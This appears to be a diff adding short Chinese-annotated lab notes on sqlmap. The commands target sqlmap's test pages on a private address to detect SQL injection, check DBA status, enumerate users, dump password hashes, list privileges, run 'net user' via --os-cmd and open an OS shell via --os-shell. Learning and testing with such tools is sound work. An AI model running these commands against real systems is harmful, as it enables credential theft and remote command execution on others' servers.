@@ -1,0 +1,21 @@
+判断注入类型
+python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" 
+
+
+判断当前用户是否是dba
+python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --is-dba -v 1
+
+python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --users -v 0
+列举数据库用户密码
+
+python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --passwords -v 0
+
+
+查看用户权限
+python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --privileges -v 0
+
+python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --os-cmd=net user
+
+python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" --os-shell
+
+
